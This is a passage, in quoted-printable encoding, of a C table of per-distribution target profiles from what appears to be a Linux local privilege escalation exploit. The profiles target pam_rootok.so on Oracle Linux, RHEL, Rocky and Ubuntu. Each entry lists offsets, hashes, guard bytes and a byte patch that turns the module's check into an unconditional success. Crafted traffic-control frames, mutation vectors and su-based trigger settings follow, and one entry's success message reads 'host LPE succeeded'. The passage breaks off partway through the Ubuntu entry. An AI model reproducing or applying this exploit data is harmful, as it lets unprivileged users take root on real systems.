    .kernel_releases =3D "6.12.0-204.92.4.3.el10uek.x86_64,6.12.0-211.7.3=
.el10_2.x86_64,6.12.0-204.92.4.4.el10uek.x86_64",
    .distribution_id =3D "ol",
    .distribution_version =3D "10.2",
    .package_name =3D "pam",
    .package_versions =3D "1.6.1-9.el10",
    .filesystem =3D "xfs",
    .lsm_constraint =3D "selinux:Enforcing:unconfined_t",
    .target_path =3D "/usr/lib64/security/pam_rootok.so",
    .target_build_id =3D "87b4cfb5d388a1e3aea161a83f6f6ecf0c44ef6c",
    .baseline_sha256 =3D "452aee0242ae83e30a026920423320d48da6ec635222dfe=
8e7cd0f6616a208ad",
    .mutated_sha256 =3D "61cb658895de1ba722745cb7c90a58d3ea3c17a2ef1b90cb=
9c9becd66d3a4fae",
    .backing_page_sha256 =3D "2dc8b86c5e0bac1462051a0b7f71128474c561980ba=
5c098d48c4c1db06dadf2",
    .package_query =3D "rpm",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "xfs_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "oraclelinux102-uek8-recovery",
    .recovery_sha256 =3D "3c1f309a25368a5a246a9cb2e4bc9939e71ea3250f9ec2d=
a466af9d849bd9d45",
    .distribution_suite =3D "",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1001, .expected_gid =3D 1001,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0755, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3cb8), .target_offset =3D UINT64_C(0x149d=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x64, 0x48, 0x8b, 0x1c, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x89, 0=
x5c, 0x24, 0x08, 0x89, 0xf3
    }, .original_slice =3D {
      0xe8, 0xde, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x4a, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x54, 0x0b, 0x00
    },
    .success_message =3D "Oracle Linux 10.2 UEK 8 host LPE succeeded",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x79, 0=
x6e, 0xb1, 0x2e, 0xf8, 0x9c, 
      0x94, 0x69, 0x67, 0x07, 0xbd, 0xf5, 0x3e, 0x44, 0x4e, 0x56, 0x63, 0=
xb5, 0x9e, 0xd9, 0x2d, 0xa9, 
      0x16, 0xe3, 0x5d, 0xf3, 0xb8, 0x6d, 0xda, 0x8f, 0x05, 0x1b, 0xcc, 0=
xa4, 0x1c, 0x3f, 0xd7, 0x16, 
      0x56, 0x17, 0x25, 0x37, 0x17, 0x39, 0x50, 0x86, 0xd7, 0x39, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x7b, 0x12, 0xa4, 0x87, 0x0f, 0x48, 0x04, 0x21, 0x87, 0=
x07, 0xbc, 0x3f, 0xad, 0x1c, 
      0x92, 0x07, 0xa4, 0xef, 0xb2, 0x6e, 0xa0, 0xd1, 0x25, 0x67, 0x97, 0=
xb5, 0x17, 0xb9, 0xdd, 0x21, 
      0x10, 0x7d, 0x1f, 0x24, 0xe6, 0xde, 0xa4, 0xb6, 0xad, 0x50, 0x6e, 0=
xd8, 0x65, 0x3c, 0x5a, 0xd2, 
      0xe7, 0x34, 0xc0, 0x92, 0x64, 0x7f, 0x24, 0xf2, 0x12, 0xe8, 0x23, 0=
xa2, 0x17, 0xa2, 0x10, 0xe6, 
      0xe0, 0xe9, 0xf4, 0x95, 0x08, 0x24, 0x4a, 0xa3, 0x3a, 0x42, 0x3e, 0=
xd4, 0xb9, 0xd5, 0x29, 0x6f, 
      0xf5, 0x69, 0x80, 0x23, 0xd0, 0x2e, 0x61, 0x0f, 0x12, 0xf6, 0xd3, 0=
x44, 0x0a, 0xcb, 0x76, 0xf2, 
      0xdb, 0xdb, 0x1a, 0xab, 0xdd, 0xf0, 0x6c, 0x76, 0xad, 0x02, 0x83, 0=
xfc, 0x57, 0x95, 0x73, 0x60, 
      0xf7, 0x25, 0xf6, 0xe0, 0x96, 0x20, 0x0a, 0x7c, 0x55, 0x5d, 0x7f, 0=
xa3, 0x9a, 0x84, 0x2e, 0xff, 
      0xe9, 0xa1, 0xce, 0xc5, 0x8d, 0xeb, 0xd0, 0x7b, 0xeb, 0xc2, 0x63, 0=
x9d, 0xb2, 0x61, 0x7f, 0x3d, 
      0x90, 0x59, 0xe3, 0xbd, 0x0b, 0x0b, 0x94, 0x50, 0x89, 0xfe, 0x68, 0=
xf3, 0x6d, 0x98, 0xcc, 0xb7, 
      0x6e, 0x2a, 0x59, 0xd5, 0xa4, 0x05, 0x52, 0xfd, 0x05, 0xfc, 0x4c, 0=
x52, 0xa2, 0xb2, 0x63, 0x65, 
      0x4c, 0x35, 0xba, 0x29, 0x1e, 0xc2, 0x59, 0x0f, 0xda, 0x3e, 0xdc, 0=
x34, 0xbd, 0x0a, 0x3e, 0x6c, 
      0x36, 0x0e, 0xff, 0x9d, 0x74, 0x88, 0xf9, 0x38, 0x2a, 0xf1, 0x98, 0=
xe4, 0x8f, 0xf4, 0x1d, 0x01, 
      0x52, 0xf0, 0x70, 0x49, 0x44, 0x6b, 0xbe, 0x66, 0x36, 0x3e, 0x9a, 0=
x30, 0x15, 0x69, 0x58, 0x68, 
      0x38, 0x05, 0x68, 0x64, 0x2a, 0xbe, 0x23, 0x86, 0x38, 0x17, 0x1f, 0=
x84, 0x5c, 0x8f, 0x1a, 0xa2, 
      0xa5, 0x8e, 0x4a, 0xdf, 0x34, 0x09, 0xdb, 0xba, 0x0a, 0x00, 0x38, 0=
x29, 0xdc, 0x5a, 0xc4, 0x86, 
      0xb4, 0x1c, 0x34, 0x00, 0xef, 0x25, 0x65, 0xb8, 0x85, 0x73, 0xa5, 0=
x29, 0x0b, 0x0f, 0x61, 0x16, 
      0x16, 0x92, 0xf4, 0xdf, 0x27, 0x3f, 0x8c, 0x52, 0xbb, 0x8c, 0x33, 0=
x5d, 0xd2, 0x3b, 0xff, 0x23, 
      0xa4, 0xb3, 0x1a, 0x31, 0xfb, 0xd5, 0x02, 0x0a, 0xb9, 0xd7, 0xfa, 0=
x09, 0x16, 0x30, 0xb2, 0x79, 
      0x94, 0xa7, 0x08, 0x8f, 0xaf, 0x5f, 0xb6, 0xe7, 0x3e, 0x38, 0x80, 0=
x90, 0xc4, 0x42, 0xf5, 0x0f, 
      0x0f, 0x6f, 0x97, 0xc7, 0x5f, 0x34, 0x25, 0x28, 0x90, 0xf6, 0x43, 0=
x44, 0x2f, 0xcb, 0x58, 0x96, 
      0x70, 0x95, 0xcc, 0x72, 0xc3, 0xcc, 0x57, 0x47, 0x1c, 0x95, 0xa5, 0=
xa3, 0x0c, 0xec, 0x05, 0xdf, 
      0xbc, 0x94, 0x06, 0x8f, 0xcb, 0x2c, 0xb4, 0xff, 0xb3, 0x6e, 0x60, 0=
x34, 0xd6, 0x80, 0x2c, 0x9e, 
      0x1d, 0xd7, 0x70, 0x64, 0x99, 0x69, 0xe3, 0x0c, 0x61, 0x66, 0x1a, 0=
x14, 0x6f, 0x7b, 0x21, 0xaf, 
      0xc1, 0x34, 0xb4, 0x99, 0x31, 0xe9, 0x33, 0x8a, 0x07, 0x1c, 0x3d, 0=
xfe, 0x8a, 0x6a, 0x7d, 0x2e, 
      0xe0, 0xac, 0xa8, 0x11, 0xe2, 0xaf, 0x44, 0xbb, 0x94, 0xb4, 0xfc, 0=
xd6, 0x27, 0xb8, 0x7f, 0xaf, 
      0xea, 0x13, 0x1f, 0x7f, 0x56, 0x89, 0x8a, 0xcd, 0x0b, 0x59, 0xd9, 0=
x71, 0x91, 0x53, 0x7a, 0xf1, 
      0x94, 0xd4, 0x94, 0xc6, 0x4d, 0xe5, 0x92, 0x95, 0x1a, 0x07, 0x86, 0=
xe7, 0x1b, 0xe2, 0xb3, 0x9e, 
      0xa7, 0x75, 0x16, 0x1f, 0xf9, 0xa8, 0x4b, 0x02, 0xd6, 0xaf, 0x44, 0=
x1d, 0x33, 0x9c, 0x2a, 0xb0, 
      0x16, 0x9e, 0xbf, 0xd4, 0x51, 0x6f, 0x96, 0x00, 0x84, 0x2b, 0x45, 0=
x7d, 0x6e, 0x4b, 0xdd, 0xe9, 
      0xe5, 0xb4, 0x6c, 0x04, 0x38, 0xba, 0x98, 0x60, 0x68, 0x49, 0x0b, 0=
x00, 0x5b, 0xb2, 0x2d, 0xa5, 
      0x2a, 0xe4, 0xc6, 0x84, 0x7e, 0x7b, 0x29, 0x9a, 0x66, 0x0d, 0xe3, 0=
x1b, 0x2d, 0xc7, 0x16, 0x04, 
      0x30, 0x14
    },
  },
  [6] =3D {
    .profile_id =3D "rhel102",
    .evidence_aliases =3D "rhel102-current-host-poc,rhel102-stock-media-k=
612-2117-preflight",
    .kernel_releases =3D "6.12.0-211.33.1.el10_2.x86_64,6.12.0-211.7.3.el=
10_2.x86_64",
    .distribution_id =3D "rhel",
    .distribution_version =3D "10.2",
    .package_name =3D "pam",
    .package_versions =3D "1.6.1-9.el10",
    .filesystem =3D "xfs",
    .lsm_constraint =3D "selinux:Enforcing:unconfined_t",
    .target_path =3D "/usr/lib64/security/pam_rootok.so",
    .target_build_id =3D "e7061a3b81fe3fbda781592b330bedd1016387f9",
    .baseline_sha256 =3D "9b4dda006a5ea9c00fdf6aaa9f507f0a30be9ef18278608=
845dd672f2e899b6e",
    .mutated_sha256 =3D "74e861d72b69d59df35b82dc83c96a48c2826770e4c3214c=
60af0d9df9b8d3c3",
    .backing_page_sha256 =3D "2dc8b86c5e0bac1462051a0b7f71128474c561980ba=
5c098d48c4c1db06dadf2",
    .package_query =3D "rpm",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "xfs_direct",
    .recovery_mode =3D "eviction_only",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "rhel102-recovery",
    .recovery_sha256 =3D "bfed4094df83419bfa86439c92147f0397e0194504dc3a6=
06098301c818ae702",
    .distribution_suite =3D "",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0755, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3cb8), .target_offset =3D UINT64_C(0x149d=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x64, 0x48, 0x8b, 0x1c, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x89, 0=
x5c, 0x24, 0x08, 0x89, 0xf3
    }, .original_slice =3D {
      0xe8, 0xde, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x4a, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x54, 0x0b, 0x00
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x79, 0=
x6e, 0xb1, 0x2e, 0xf8, 0x9c, 
      0x94, 0x69, 0x67, 0x07, 0xbd, 0xf5, 0x3e, 0x44, 0x4e, 0x56, 0x63, 0=
xb5, 0x9e, 0xd9, 0x2d, 0xa9, 
      0x16, 0xe3, 0x5d, 0xf3, 0xb8, 0x6d, 0xda, 0x8f, 0x05, 0x1b, 0xcc, 0=
xa4, 0x1c, 0x3f, 0xd7, 0x16, 
      0x56, 0x17, 0x25, 0x37, 0x17, 0x39, 0x50, 0x86, 0xd7, 0x39, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x7b, 0x12, 0xa4, 0x87, 0x0f, 0x48, 0x04, 0x21, 0x87, 0=
x07, 0xbc, 0x3f, 0xad, 0x1c, 
      0x92, 0x07, 0xa4, 0xef, 0xb2, 0x6e, 0xa0, 0xd1, 0x25, 0x67, 0x97, 0=
xb5, 0x17, 0xb9, 0xdd, 0x21, 
      0x10, 0x7d, 0x1f, 0x24, 0xe6, 0xde, 0xa4, 0xb6, 0xad, 0x50, 0x6e, 0=
xd8, 0x65, 0x3c, 0x5a, 0xd2, 
      0xe7, 0x34, 0xc0, 0x92, 0x64, 0x7f, 0x24, 0xf2, 0x12, 0xe8, 0x23, 0=
xa2, 0x17, 0xa2, 0x10, 0xe6, 
      0xe0, 0xe9, 0xf4, 0x95, 0x08, 0x24, 0x4a, 0xa3, 0x3a, 0x42, 0x3e, 0=
xd4, 0xb9, 0xd5, 0x29, 0x6f, 
      0xf5, 0x69, 0x80, 0x23, 0xd0, 0x2e, 0x61, 0x0f, 0x12, 0xf6, 0xd3, 0=
x44, 0x0a, 0xcb, 0x76, 0xf2, 
      0xdb, 0xdb, 0x1a, 0xab, 0xdd, 0xf0, 0x6c, 0x76, 0xad, 0x02, 0x83, 0=
xfc, 0x57, 0x95, 0x73, 0x60, 
      0xf7, 0x25, 0xf6, 0xe0, 0x96, 0x20, 0x0a, 0x7c, 0x55, 0x5d, 0x7f, 0=
xa3, 0x9a, 0x84, 0x2e, 0xff, 
      0xe9, 0xa1, 0xce, 0xc5, 0x8d, 0xeb, 0xd0, 0x7b, 0xeb, 0xc2, 0x63, 0=
x9d, 0xb2, 0x61, 0x7f, 0x3d, 
      0x90, 0x59, 0xe3, 0xbd, 0x0b, 0x0b, 0x94, 0x50, 0x89, 0xfe, 0x68, 0=
xf3, 0x6d, 0x98, 0xcc, 0xb7, 
      0x6e, 0x2a, 0x59, 0xd5, 0xa4, 0x05, 0x52, 0xfd, 0x05, 0xfc, 0x4c, 0=
x52, 0xa2, 0xb2, 0x63, 0x65, 
      0x4c, 0x35, 0xba, 0x29, 0x1e, 0xc2, 0x59, 0x0f, 0xda, 0x3e, 0xdc, 0=
x34, 0xbd, 0x0a, 0x3e, 0x6c, 
      0x36, 0x0e, 0xff, 0x9d, 0x74, 0x88, 0xf9, 0x38, 0x2a, 0xf1, 0x98, 0=
xe4, 0x8f, 0xf4, 0x1d, 0x01, 
      0x52, 0xf0, 0x70, 0x49, 0x44, 0x6b, 0xbe, 0x66, 0x36, 0x3e, 0x9a, 0=
x30, 0x15, 0x69, 0x58, 0x68, 
      0x38, 0x05, 0x68, 0x64, 0x2a, 0xbe, 0x23, 0x86, 0x38, 0x17, 0x1f, 0=
x84, 0x5c, 0x8f, 0x1a, 0xa2, 
      0xa5, 0x8e, 0x4a, 0xdf, 0x34, 0x09, 0xdb, 0xba, 0x0a, 0x00, 0x38, 0=
x29, 0xdc, 0x5a, 0xc4, 0x86, 
      0xb4, 0x1c, 0x34, 0x00, 0xef, 0x25, 0x65, 0xb8, 0x85, 0x73, 0xa5, 0=
x29, 0x0b, 0x0f, 0x61, 0x16, 
      0x16, 0x92, 0xf4, 0xdf, 0x27, 0x3f, 0x8c, 0x52, 0xbb, 0x8c, 0x33, 0=
x5d, 0xd2, 0x3b, 0xff, 0x23, 
      0xa4, 0xb3, 0x1a, 0x31, 0xfb, 0xd5, 0x02, 0x0a, 0xb9, 0xd7, 0xfa, 0=
x09, 0x16, 0x30, 0xb2, 0x79, 
      0x94, 0xa7, 0x08, 0x8f, 0xaf, 0x5f, 0xb6, 0xe7, 0x3e, 0x38, 0x80, 0=
x90, 0xc4, 0x42, 0xf5, 0x0f, 
      0x0f, 0x6f, 0x97, 0xc7, 0x5f, 0x34, 0x25, 0x28, 0x90, 0xf6, 0x43, 0=
x44, 0x2f, 0xcb, 0x58, 0x96, 
      0x70, 0x95, 0xcc, 0x72, 0xc3, 0xcc, 0x57, 0x47, 0x1c, 0x95, 0xa5, 0=
xa3, 0x0c, 0xec, 0x05, 0xdf, 
      0xbc, 0x94, 0x06, 0x8f, 0xcb, 0x2c, 0xb4, 0xff, 0xb3, 0x6e, 0x60, 0=
x34, 0xd6, 0x80, 0x2c, 0x9e, 
      0x1d, 0xd7, 0x70, 0x64, 0x99, 0x69, 0xe3, 0x0c, 0x61, 0x66, 0x1a, 0=
x14, 0x6f, 0x7b, 0x21, 0xaf, 
      0xc1, 0x34, 0xb4, 0x99, 0x31, 0xe9, 0x33, 0x8a, 0x07, 0x1c, 0x3d, 0=
xfe, 0x8a, 0x6a, 0x7d, 0x2e, 
      0xe0, 0xac, 0xa8, 0x11, 0xe2, 0xaf, 0x44, 0xbb, 0x94, 0xb4, 0xfc, 0=
xd6, 0x27, 0xb8, 0x7f, 0xaf, 
      0xea, 0x13, 0x1f, 0x7f, 0x56, 0x89, 0x8a, 0xcd, 0x0b, 0x59, 0xd9, 0=
x71, 0x91, 0x53, 0x7a, 0xf1, 
      0x94, 0xd4, 0x94, 0xc6, 0x4d, 0xe5, 0x92, 0x95, 0x1a, 0x07, 0x86, 0=
xe7, 0x1b, 0xe2, 0xb3, 0x9e, 
      0xa7, 0x75, 0x16, 0x1f, 0xf9, 0xa8, 0x4b, 0x02, 0xd6, 0xaf, 0x44, 0=
x1d, 0x33, 0x9c, 0x2a, 0xb0, 
      0x16, 0x9e, 0xbf, 0xd4, 0x51, 0x6f, 0x96, 0x00, 0x84, 0x2b, 0x45, 0=
x7d, 0x6e, 0x4b, 0xdd, 0xe9, 
      0xe5, 0xb4, 0x6c, 0x04, 0x38, 0xba, 0x98, 0x60, 0x68, 0x49, 0x0b, 0=
x00, 0x5b, 0xb2, 0x2d, 0xa5, 
      0x2a, 0xe4, 0xc6, 0x84, 0x7e, 0x7b, 0x29, 0x9a, 0x66, 0x0d, 0xe3, 0=
x1b, 0x2d, 0xc7, 0x16, 0x04, 
      0x30, 0x14
    },
  },
  [7] =3D {
    .profile_id =3D "rocky102",
    .evidence_aliases =3D "rocky102-host-poc,rocky102-stock-media-k612-21=
116-safe-validated",
    .kernel_releases =3D "6.12.0-211.34.1.el10_2.x86_64,6.12.0-211.16.1.e=
l10_2.0.1.x86_64",
    .distribution_id =3D "rocky",
    .distribution_version =3D "10.2",
    .package_name =3D "pam",
    .package_versions =3D "1.6.1-9.el10",
    .filesystem =3D "xfs",
    .lsm_constraint =3D "selinux:Enforcing:unconfined_t",
    .target_path =3D "/usr/lib64/security/pam_rootok.so",
    .target_build_id =3D "a28652a18b7f82a0a794172f0cf1cc5b7c1e5a22",
    .baseline_sha256 =3D "7463490212ee2c96aae5d74052901f3ffb7c5b774fab02c=
f6a52f65bb3b2ce81",
    .mutated_sha256 =3D "9ece7dfd31bb7ad4a439dc296f619d6c844b8210fe33bfaf=
cefb9c7ea866650b",
    .backing_page_sha256 =3D "2dc8b86c5e0bac1462051a0b7f71128474c561980ba=
5c098d48c4c1db06dadf2",
    .package_query =3D "rpm",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "xfs_direct",
    .recovery_mode =3D "eviction_then_inverse",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "rocky102-recovery",
    .recovery_sha256 =3D "c1466b0bfbd0bb622e61f8c72f205a08155575f0b64cfdb=
382deab8374202944",
    .distribution_suite =3D "",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0755, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3cb8), .target_offset =3D UINT64_C(0x149d=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x64, 0x48, 0x8b, 0x1c, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x89, 0=
x5c, 0x24, 0x08, 0x89, 0xf3
    }, .original_slice =3D {
      0xe8, 0xde, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x4a, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x54, 0x0b, 0x00
    },
    .success_message =3D "run command su",
    .tc_frame =3D {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x08, 0x00, 0x45, 0x00, 
      0x02, 0x5c, 0x23, 0x45, 0x00, 0x00, 0x40, 0x32, 0x57, 0x29, 0x7f, 0=
x00, 0x00, 0x01, 0x7f, 0x00, 
      0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x79, 0=
x6e, 0xb1, 0x2e, 0xf8, 0x9c, 
      0x94, 0x69, 0x67, 0x07, 0xbd, 0xf5, 0x3e, 0x44, 0x4e, 0x56, 0x63, 0=
xb5, 0x9e, 0xd9, 0x2d, 0xa9, 
      0x16, 0xe3, 0x5d, 0xf3, 0xb8, 0x6d, 0xda, 0x8f, 0x05, 0x1b, 0xcc, 0=
xa4, 0x1c, 0x3f, 0xd7, 0x16, 
      0x56, 0x17, 0x25, 0x37, 0x17, 0x39, 0x50, 0x86, 0xd7, 0x39, 0x90, 0=
x91, 0x92, 0x93, 0x94, 0x95
    }, .mutation_vector =3D {
      0x9e, 0x9f, 0x7b, 0x12, 0xa4, 0x87, 0x0f, 0x48, 0x04, 0x21, 0x87, 0=
x07, 0xbc, 0x3f, 0xad, 0x1c, 
      0x92, 0x07, 0xa4, 0xef, 0xb2, 0x6e, 0xa0, 0xd1, 0x25, 0x67, 0x97, 0=
xb5, 0x17, 0xb9, 0xdd, 0x21, 
      0x10, 0x7d, 0x1f, 0x24, 0xe6, 0xde, 0xa4, 0xb6, 0xad, 0x50, 0x6e, 0=
xd8, 0x65, 0x3c, 0x5a, 0xd2, 
      0xe7, 0x34, 0xc0, 0x92, 0x64, 0x7f, 0x24, 0xf2, 0x12, 0xe8, 0x23, 0=
xa2, 0x17, 0xa2, 0x10, 0xe6, 
      0xe0, 0xe9, 0xf4, 0x95, 0x08, 0x24, 0x4a, 0xa3, 0x3a, 0x42, 0x3e, 0=
xd4, 0xb9, 0xd5, 0x29, 0x6f, 
      0xf5, 0x69, 0x80, 0x23, 0xd0, 0x2e, 0x61, 0x0f, 0x12, 0xf6, 0xd3, 0=
x44, 0x0a, 0xcb, 0x76, 0xf2, 
      0xdb, 0xdb, 0x1a, 0xab, 0xdd, 0xf0, 0x6c, 0x76, 0xad, 0x02, 0x83, 0=
xfc, 0x57, 0x95, 0x73, 0x60, 
      0xf7, 0x25, 0xf6, 0xe0, 0x96, 0x20, 0x0a, 0x7c, 0x55, 0x5d, 0x7f, 0=
xa3, 0x9a, 0x84, 0x2e, 0xff, 
      0xe9, 0xa1, 0xce, 0xc5, 0x8d, 0xeb, 0xd0, 0x7b, 0xeb, 0xc2, 0x63, 0=
x9d, 0xb2, 0x61, 0x7f, 0x3d, 
      0x90, 0x59, 0xe3, 0xbd, 0x0b, 0x0b, 0x94, 0x50, 0x89, 0xfe, 0x68, 0=
xf3, 0x6d, 0x98, 0xcc, 0xb7, 
      0x6e, 0x2a, 0x59, 0xd5, 0xa4, 0x05, 0x52, 0xfd, 0x05, 0xfc, 0x4c, 0=
x52, 0xa2, 0xb2, 0x63, 0x65, 
      0x4c, 0x35, 0xba, 0x29, 0x1e, 0xc2, 0x59, 0x0f, 0xda, 0x3e, 0xdc, 0=
x34, 0xbd, 0x0a, 0x3e, 0x6c, 
      0x36, 0x0e, 0xff, 0x9d, 0x74, 0x88, 0xf9, 0x38, 0x2a, 0xf1, 0x98, 0=
xe4, 0x8f, 0xf4, 0x1d, 0x01, 
      0x52, 0xf0, 0x70, 0x49, 0x44, 0x6b, 0xbe, 0x66, 0x36, 0x3e, 0x9a, 0=
x30, 0x15, 0x69, 0x58, 0x68, 
      0x38, 0x05, 0x68, 0x64, 0x2a, 0xbe, 0x23, 0x86, 0x38, 0x17, 0x1f, 0=
x84, 0x5c, 0x8f, 0x1a, 0xa2, 
      0xa5, 0x8e, 0x4a, 0xdf, 0x34, 0x09, 0xdb, 0xba, 0x0a, 0x00, 0x38, 0=
x29, 0xdc, 0x5a, 0xc4, 0x86, 
      0xb4, 0x1c, 0x34, 0x00, 0xef, 0x25, 0x65, 0xb8, 0x85, 0x73, 0xa5, 0=
x29, 0x0b, 0x0f, 0x61, 0x16, 
      0x16, 0x92, 0xf4, 0xdf, 0x27, 0x3f, 0x8c, 0x52, 0xbb, 0x8c, 0x33, 0=
x5d, 0xd2, 0x3b, 0xff, 0x23, 
      0xa4, 0xb3, 0x1a, 0x31, 0xfb, 0xd5, 0x02, 0x0a, 0xb9, 0xd7, 0xfa, 0=
x09, 0x16, 0x30, 0xb2, 0x79, 
      0x94, 0xa7, 0x08, 0x8f, 0xaf, 0x5f, 0xb6, 0xe7, 0x3e, 0x38, 0x80, 0=
x90, 0xc4, 0x42, 0xf5, 0x0f, 
      0x0f, 0x6f, 0x97, 0xc7, 0x5f, 0x34, 0x25, 0x28, 0x90, 0xf6, 0x43, 0=
x44, 0x2f, 0xcb, 0x58, 0x96, 
      0x70, 0x95, 0xcc, 0x72, 0xc3, 0xcc, 0x57, 0x47, 0x1c, 0x95, 0xa5, 0=
xa3, 0x0c, 0xec, 0x05, 0xdf, 
      0xbc, 0x94, 0x06, 0x8f, 0xcb, 0x2c, 0xb4, 0xff, 0xb3, 0x6e, 0x60, 0=
x34, 0xd6, 0x80, 0x2c, 0x9e, 
      0x1d, 0xd7, 0x70, 0x64, 0x99, 0x69, 0xe3, 0x0c, 0x61, 0x66, 0x1a, 0=
x14, 0x6f, 0x7b, 0x21, 0xaf, 
      0xc1, 0x34, 0xb4, 0x99, 0x31, 0xe9, 0x33, 0x8a, 0x07, 0x1c, 0x3d, 0=
xfe, 0x8a, 0x6a, 0x7d, 0x2e, 
      0xe0, 0xac, 0xa8, 0x11, 0xe2, 0xaf, 0x44, 0xbb, 0x94, 0xb4, 0xfc, 0=
xd6, 0x27, 0xb8, 0x7f, 0xaf, 
      0xea, 0x13, 0x1f, 0x7f, 0x56, 0x89, 0x8a, 0xcd, 0x0b, 0x59, 0xd9, 0=
x71, 0x91, 0x53, 0x7a, 0xf1, 
      0x94, 0xd4, 0x94, 0xc6, 0x4d, 0xe5, 0x92, 0x95, 0x1a, 0x07, 0x86, 0=
xe7, 0x1b, 0xe2, 0xb3, 0x9e, 
      0xa7, 0x75, 0x16, 0x1f, 0xf9, 0xa8, 0x4b, 0x02, 0xd6, 0xaf, 0x44, 0=
x1d, 0x33, 0x9c, 0x2a, 0xb0, 
      0x16, 0x9e, 0xbf, 0xd4, 0x51, 0x6f, 0x96, 0x00, 0x84, 0x2b, 0x45, 0=
x7d, 0x6e, 0x4b, 0xdd, 0xe9, 
      0xe5, 0xb4, 0x6c, 0x04, 0x38, 0xba, 0x98, 0x60, 0x68, 0x49, 0x0b, 0=
x00, 0x5b, 0xb2, 0x2d, 0xa5, 
      0x2a, 0xe4, 0xc6, 0x84, 0x7e, 0x7b, 0x29, 0x9a, 0x66, 0x0d, 0xe3, 0=
x1b, 0x2d, 0xc7, 0x16, 0x04, 
      0x30, 0x14
    },
  },
  [8] =3D {
    .profile_id =3D "ubuntu1804-k415",
    .evidence_aliases =3D "ubuntu1804-k415-host-poc,ubuntu1804-server-k41=
5,ubuntu1804-desktop-k415",
    .kernel_releases =3D "4.15.0-213-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "18.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.1.8-3.6ubuntu2",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "990df46563447100b07f92f78aef0480284e8a0a",
    .baseline_sha256 =3D "870b6a5841c988c6c106caf7caf188957386bbccde3270c=
aa9e31ae1fb394ec5",
    .mutated_sha256 =3D "42d1284dc29165a5d7281cbc43f689fee297c1be4df5ab3d=
7e35e40f260797ce",
    .backing_page_sha256 =3D "3d5e589e7a8214d96e7e3d3af4359781e8d6a6bfc29=
b5d50c2aff63629d59232",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "embedded_u32",
    .consumer_mode =3D "pty_su",
    .direct_io_mode =3D "ext4_direct",
